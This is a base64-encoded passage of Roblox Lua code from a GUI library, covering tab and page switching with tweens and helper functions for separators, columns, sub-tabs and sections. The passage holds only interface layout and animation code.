CAgIFNpemUgPSBkaW0yKDEsIC0yMCwgMCwgNik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSB0aGVtZXMucHJlc2V0LmFjY2VudAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOyBsaWJyYXJ5OmFwcGx5X3RoZW1lKG11bHRpX2l0ZW1zWyAiYWNjZW50IiBdLCAiYWNjZW50IiwgIkJhY2tncm91bmRDb2xvcjMiKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gbXVsdGlfaXRlbXNbICJhY2NlbnQiIF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA5OTkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVBhZGRpbmciICwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBtdWx0aV9pdGVtc1sgImJ1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDEwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ0xlZnQgPSBkaW0oMCwgMTApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IG11bHRpX2l0ZW1zWyAiYnV0dG9uIiBdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgNykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIFRhYiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtdWx0aV9pdGVtc1sgInRhYiIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBsaWJyYXJ5LmNhY2hlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgLTIwLCAxLCAtMjApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBWaXNpYmxlID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJTGlzdExheW91dCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZpbGxEaXJlY3Rpb24gPSBFbnVtLkZpbGxEaXJlY3Rpb24uVmVydGljYWw7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEhvcml6b250YWxGbGV4ID0gRW51bS5VSUZsZXhBbGlnbm1lbnQuRmlsbDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gbXVsdGlfaXRlbXNbICJ0YWIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmcgPSBkaW0oMCwgNyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNvcnRPcmRlciA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBWZXJ0aWNhbEZsZXggPSBFbnVtLlVJRmxleEFsaWdubWVudC5GaWxsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVBhZGRpbmciICwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nVG9wID0gZGltKDAsIDcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nQm90dG9tID0gZGltKDAsIDcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBtdWx0aV9pdGVtc1sgInRhYiIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nTGVmdCA9IGRpbSgwLCA3KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0KICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBkYXRhLnRleHQgPSBtdWx0aV9pdGVtc1sgIm5hbWUiIF0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0YS5hY2NlbnQgPSBtdWx0aV9pdGVtc1sgImFjY2VudCIgXQogICAgICAgICAgICAgICAgICAgICAgICBkYXRhLmJ1dHRvbiA9IG11bHRpX2l0ZW1zWyAiYnV0dG9uIiBdCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEucGFnZSA9IG11bHRpX2l0ZW1zWyAidGFiIiBdCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEucGFyZW50ID0gc2V0bWV0YXRhYmxlKGRhdGEsIGxpYnJhcnkpOnN1Yl90YWIoe30pLml0ZW1zWyAidGFiX3BhcmVudCIgXQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgLS0gT2xkIGNvbHVtbiBjb2RlCiAgICAgICAgICAgICAgICAgICAgICAgIC0tIGRhdGEubGVmdCA9IG11bHRpX2l0ZW1zWyAibGVmdCIgXQogICAgICAgICAgICAgICAgICAgICAgICAtLSBkYXRhLnJpZ2h0ID0gbXVsdGlfaXRlbXNbICJyaWdodCIgXQoKCQkJCQkJZnVuY3Rpb24gZGF0YS5vcGVuX3BhZ2UoKQoJCQkJCQkJbG9jYWwgcGFnZSA9IGNmZy5jdXJyZW50X211bHRpOyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGFnZSBhbmQgcGFnZS50ZXh0IH49IGRhdGEudGV4dCB0aGVuIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuaXRlbXNbICJnbG9iYWxfZmFkZSIgXS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oc2VsZi5pdGVtc1sgImdsb2JhbF9mYWRlIiBdLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDF9LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIDAuNCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBvbGRfc2l6ZSA9IHBhZ2UucGFnZS5TaXplCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFnZS5wYWdlLlNpemUgPSBkaW0yKDEsIC0yMCwgMSwgLTIwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGFnZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihwYWdlLnRleHQsIHtUZXh0Q29sb3IzID0gcmdiKDYyLCA2MiwgNjMpfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKHBhZ2UuYWNjZW50LCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDF9KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4ocGFnZS5idXR0b24sIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMX0pCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhZ2UucGFnZS5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYWdlLnBhZ2UuUGFyZW50ID0gbGlicmFyeVsgImNhY2hlIiBdIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGRhdGEudGV4dCwge1RleHRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSl9KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihkYXRhLmFjY2VudCwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAwfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oZGF0YS5idXR0b24sIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMH0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGRhdGEucGFnZSwge1NpemUgPSBkaW0yKDEsIDAsIDEsIDApfSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCAwLjQpCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YS5wYWdlLlZpc2libGUgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhLnBhZ2UuUGFyZW50ID0gaXRlbXNbInRhYl9ob2xkZXIiXQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNmZy5jdXJyZW50X211bHRpID0gZGF0YQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y2xvc2VfZWxlbWVudCgpCgkJCQkJCWVuZAoKCQkJCQkJbXVsdGlfaXRlbXNbICJidXR0b24iIF0uSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKElucHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgSW5wdXQuVXNlcklucHV0VHlwZSB+PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbiByZXR1cm4gZW5kCgkJCQkJCQlkYXRhLm9wZW5fcGFnZSgpIAoJCQkJCQllbmQpCgoJCQkJCQljZmcucGFnZXNbI2NmZy5wYWdlcyArIDFdID0gc2V0bWV0YXRhYmxlKGRhdGEsIGxpYnJhcnkpCiAgICAgICAgICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgICAgICAgICBjZmcucGFnZXNbMV0ub3Blbl9wYWdlKCkKICAgICAgICAgICAgICAgIC0tCiAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5vcGVuX3RhYigpIAogICAgICAgICAgICAgICAgbG9jYWwgc2VsZWN0ZWRfdGFiID0gc2VsZi5zZWxlY3RlZF90YWIKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgc2VsZWN0ZWRfdGFiIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgaWYgc2VsZWN0ZWRfdGFiWyA0IF0gfj0gaXRlbXNbICJ0YWJfaG9sZGVyIiBdIHRoZW4gCiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuaXRlbXNbICJnbG9iYWxfZmFkZSIgXS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMAogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihzZWxmLml0ZW1zWyAiZ2xvYmFsX2ZhZGUiIF0sIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMX0sIEVudW0uRWFzaW5nU3R5bGUuUXVhZCwgMC40KQogICAgICAgICAgICAgICAgICAgICAgICBzZWxlY3RlZF90YWJbIDQgXS5TaXplID0gZGltMigxLCAtMjE2LCAxLCAtMTAxKQogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKHNlbGVjdGVkX3RhYlsgMSBdLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDF9KQogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oc2VsZWN0ZWRfdGFiWyAyIF0sIHtJbWFnZUNvbG9yMyA9IHJnYig3MiwgNzIsIDczKX0pCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihzZWxlY3RlZF90YWJbIDMgXSwge1RleHRDb2xvcjMgPSByZ2IoNzIsIDcyLCA3Myl9KQoKICAgICAgICAgICAgICAgICAgICBzZWxlY3RlZF90YWJbIDQgXS5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBzZWxlY3RlZF90YWJbIDQgXS5QYXJlbnQgPSBsaWJyYXJ5WyAiY2FjaGUiIF0KICAgICAgICAgICAgICAgICAgICBzZWxlY3RlZF90YWJbIDUgXS5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBzZWxlY3RlZF90YWJbIDUgXS5QYXJlbnQgPSBsaWJyYXJ5WyAiY2FjaGUiIF0KICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJidXR0b24iIF0sIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMH0pCiAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAiaWNvbiIgXSwge0ltYWdlQ29sb3IzID0gdGhlbWVzLnByZXNldC5hY2NlbnR9KQogICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgIm5hbWUiIF0sIHtUZXh0Q29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpfSkKICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJ0YWJfaG9sZGVyIiBdLCB7U2l6ZSA9IGRpbTIoMSwgLTE5NiwgMSwgLTgxKX0sIEVudW0uRWFzaW5nU3R5bGUuUXVhZCwgMC40KQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgInRhYl9ob2xkZXIiIF0uVmlzaWJsZSA9IHRydWUgCiAgICAgICAgICAgICAgICBpdGVtc1sgInRhYl9ob2xkZXIiIF0uUGFyZW50ID0gc2VsZi5pdGVtc1sgIm1haW4iIF0KICAgICAgICAgICAgICAgIGl0ZW1zWyAibXVsdGlfc2VjdGlvbl9idXR0b25faG9sZGVyIiBdLlZpc2libGUgPSB0cnVlIAogICAgICAgICAgICAgICAgaXRlbXNbICJtdWx0aV9zZWN0aW9uX2J1dHRvbl9ob2xkZXIiIF0uUGFyZW50ID0gc2VsZi5pdGVtc1sgIm11bHRpX2hvbGRlciIgXQoKICAgICAgICAgICAgICAgIHNlbGYuc2VsZWN0ZWRfdGFiID0gewogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAiYnV0dG9uIiBdOwogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAiaWNvbiIgXTsKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgIm5hbWUiIF07CiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJ0YWJfaG9sZGVyIiBdOwogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAibXVsdGlfc2VjdGlvbl9idXR0b25faG9sZGVyIiBdOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y2xvc2VfZWxlbWVudCgpCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgaXRlbXNbICJidXR0b24iIF0uSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKElucHV0KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgSW5wdXQuVXNlcklucHV0VHlwZSB+PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICBjZmcub3Blbl90YWIoKQogICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBub3Qgc2VsZi5zZWxlY3RlZF90YWIgdGhlbiAKICAgICAgICAgICAgICAgIGNmZy5vcGVuX3RhYih0cnVlKSAKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICByZXR1cm4gdW5wYWNrKGNmZy5wYWdlcykKICAgICAgICBlbmQKCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTpzZXBlcmF0b3IocHJvcGVydGllcykKICAgICAgICAgICAgbG9jYWwgY2ZnID0ge2l0ZW1zID0ge30sIG5hbWUgPSBwcm9wZXJ0aWVzLk5hbWUgb3IgcHJvcGVydGllcy5uYW1lIG9yICJHZW5lcmFsIn0KCiAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0gY2ZnLml0ZW1zIGRvIAogICAgICAgICAgICAgICAgaXRlbXNbICJuYW1lIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuZm9udDsKICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDcyLCA3MiwgNzMpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBUZXh0ID0gY2ZnLm5hbWU7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gc2VsZi5pdGVtc1sgImJ1dHRvbl9ob2xkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDQwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICBUZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOyAKICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlhZOwogICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTY7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm5hbWUiIF07CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDUpOwogICAgICAgICAgICAgICAgICAgIFBhZGRpbmdMZWZ0ID0gZGltKDAsIDUpCiAgICAgICAgICAgICAgICB9KTsgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGVuZDsgICAgCgogICAgICAgICAgICByZXR1cm4gc2V0bWV0YXRhYmxlKGNmZywgbGlicmFyeSkKICAgICAgICBlbmQgCgogICAgICAgIC0tIE1pc2NlbGxhbmVvdXMgCiAgICAgICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6Y29sdW1uKHByb3BlcnRpZXMpIAogICAgICAgICAgICAgICAgbG9jYWwgY2ZnID0ge2l0ZW1zID0ge30sIHNpemUgPSBwcm9wZXJ0aWVzLnNpemUgb3IgMX0KCiAgICAgICAgICAgICAgICBsb2NhbCBpdGVtcyA9IGNmZy5pdGVtczsgZG8gICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAiY29sdW1uIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IHNlbGZbICJwYXJlbnQiIF0gb3Igc2VsZi5pdGVtc1sidGFiX3BhcmVudCJdOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMCwgY2ZnLnNpemUsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVBhZGRpbmciICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nQm90dG9tID0gZGltKDAsIDEwKTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJjb2x1bW4iIF0KICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJTGlzdExheW91dCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiY29sdW1uIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBIb3Jpem9udGFsRmxleCA9IEVudW0uVUlGbGV4QWxpZ25tZW50LkZpbGw7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmcgPSBkaW0oMCwgMTApOwogICAgICAgICAgICAgICAgICAgICAgICBGaWxsRGlyZWN0aW9uID0gRW51bS5GaWxsRGlyZWN0aW9uLlZlcnRpY2FsOwogICAgICAgICAgICAgICAgICAgICAgICBTb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcgogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgICAgIHJldHVybiBzZXRtZXRhdGFibGUoY2ZnLCBsaWJyYXJ5KQogICAgICAgICAgICBlbmQgCgogICAgICAgICAgICBmdW5jdGlvbiBsaWJyYXJ5OnN1Yl90YWIocHJvcGVydGllcykgCiAgICAgICAgICAgICAgICBsb2NhbCBjZmcgPSB7aXRlbXMgPSB7fSwgb3JkZXIgPSBwcm9wZXJ0aWVzLm9yZGVyIG9yIDA7IHNpemUgPSBwcm9wZXJ0aWVzLnNpemUgb3IgMX0KCiAgICAgICAgICAgICAgICBsb2NhbCBpdGVtcyA9IGNmZy5pdGVtczsgZG8gCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJ0YWJfcGFyZW50IiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IHNlbGYuaXRlbXNbICJ0YWIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwwLGNmZy5zaXplLDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIFZpc2libGUgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUxpc3RMYXlvdXQiICwgewogICAgICAgICAgICAgICAgICAgICAgICBGaWxsRGlyZWN0aW9uID0gRW51bS5GaWxsRGlyZWN0aW9uLkhvcml6b250YWw7CiAgICAgICAgICAgICAgICAgICAgICAgIEhvcml6b250YWxGbGV4ID0gRW51bS5VSUZsZXhBbGlnbm1lbnQuRmlsbDsKICAgICAgICAgICAgICAgICAgICAgICAgVmVydGljYWxGbGV4ID0gRW51bS5VSUZsZXhBbGlnbm1lbnQuRmlsbDsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJ0YWJfcGFyZW50IiBdOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nID0gZGltKDAsIDcpOwogICAgICAgICAgICAgICAgICAgICAgICBTb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcjsKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgIHJldHVybiBzZXRtZXRhdGFibGUoY2ZnLCBsaWJyYXJ5KQogICAgICAgICAgICBlbmQgCiAgICAgICAgLS0KCiAgICAgICAgZnVuY3Rpb24gbGlicmFyeTpzZWN0aW9uKHByb3BlcnRpZXMpCiAgICAgICAgICAgIGxvY2FsIGNmZyA9IHsKICAgICAgICAgICAgICAgIG5hbWUgPSBwcm9wZXJ0aWVzLm5hbWUgb3IgcHJvcGVydGllcy5OYW1lIG9yICJzZWN0aW9uIjsgCiAgICAgICAgICAgICAgICBzaWRlID0gcHJvcGVydGllcy5zaWRlIG9yIHByb3BlcnRpZXMuU2lkZSBvciAibGVmdCI7CiAgICAgICAgICAgICAgICBkZWZhdWx0ID0gcHJvcGVydGllcy5kZWZhdWx0IG9yIHByb3BlcnRpZXMuRGVmYXVsdCBvciBmYWxzZTsKICAgICAgICAgICAgICAgIHNpemUgPSBwcm9wZXJ0aWVzLnNpemUgb3IgcHJvcGVydGllcy5TaXplIG9yIHNlbGYuc2l6ZSBvciAwLjU7IAogICAgICAgICAgICAgICAgaWNvbiA9IHByb3BlcnRpZXMuaWNvbiBvciBwcm9wZXJ0aWVzLkljb24gb3IgImh0dHA6Ly93d3cucm9ibG94LmNvbS9hc3NldC8/aWQ9NjAyMjY2ODg5OCI7CiAgICAgICAgICAgICAgICBmYWRpbmdfdG9nZ2xlID0gcHJvcGVydGllcy5mYWRpbmcgb3IgcHJvcGVydGllcy5GYWRpbmcgb3IgZmFsc2U7CiAgICAgICAgICAgICAgICBpdGVtcyA9IHt9OwogICAgICAgICAgICB9OwogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgaXRlbXMgPSBjZmcuaXRlbXM7IGRvIAogICAgICAgICAgICAgICAgaXRlbXNbICJvdXRsaW5lIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gc2VsZi5pdGVtc1sgImNvbHVtbiIgXTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMCwgY2ZnLnNpemUsIC0zKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjUsIDI1LCAyOSkKICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3